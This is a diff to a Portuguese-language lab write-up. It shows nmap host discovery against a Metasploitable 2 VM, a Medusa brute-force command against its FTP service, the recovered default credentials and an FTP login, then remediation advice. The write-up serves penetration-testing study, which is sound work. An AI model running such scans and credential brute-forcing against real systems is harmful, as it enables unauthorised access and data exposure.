@@ -13,14 +13,14 @@ observado
 inet 192.168.0.105  netmask 255.255.255.0
 ```
   
-### 2. uso da ferramenta nmap para descobrir os dispositivos na rede local, encontrando a maquina virtual do Metasploitable 2 e quais portas estão abertas  
+### 2. uso da ferramenta nmap para descobrir os dispositivos na rede local, encontrando a maquina virtual do Metasploitable 2 e quais portas estão abertas (enumeração)
 input
 ```bash
 nmap -v
 ```
 output
 ```text
-  Nmap scan report for 192.168.0.1  
+Nmap scan report for 192.168.0.1  
 Host is up (0.0014s latency).  
 Not shown: 997 closed tcp ports (reset)  
 PORT     STATE SERVICE  
@@ -70,8 +70,23 @@ Os arquivos de users e senhas são simples apenas para a demonstração
 medusa -h (ip alvo) -U (arquivo com usuários) -P (arquivo com senhas) -M (protocolo / porta a atacar) -t (numero de threads ao mesmo tempo)  
 ```
 
-### 2. Rodando o comando, o aplicativo tentará usar cada combinação usuario-senha para encontrar a correta
-bash
+### 2. O aplicativo tentará usar cada combinação usuario-senha para encontrar a correta
+input
+```bash
 medusa -h 192.168.0.155 -U users.txt. -P pass.txt. -M ftp -t 6
- 
+```
+dentre várias tentativas, busco a que contem:
+```text
+2026-11-19 15:36:11 ACCOUNT FOUND: [ftp] Host: 192.168.0.155 User: msfadmin Password: msfadmin [SUCCESS]
+```
 
+- agora que tenho user: msfadmin e senha: msfadmin, posso fazer a autenticação com o protocoo FTP
+```bash
+ftp 192.168.0.155
+```
+- o usuário e senha são pedidos e inseridos, estabelecendo conexão e expondo a máquinas à perigos como exposição de dados sensíveis, execução remota de código, interceptação de tráfego e adulteração ou destruição de arquivos
+
+### Remediação
+• Substituir o protocolo: Desativar o FTP tradicional e migrar o serviço para SFTP (SSH File Transfer Protocol) ou FTPS (FTP sobre SSL/TLS), garantindo que toda a comunicação seja criptografada.
+• Desabilitar acesso anônimo: Configurar o servidor (ex: vsftpd, ProFTPD) para bloquear logins anônimos.
+• Princípio do menor privilégio: Restringir os usuários autenticados apenas aos seus diretórios específicos (chroot jail) e remover permissões de escrita onde não forem estritamente necessárias.
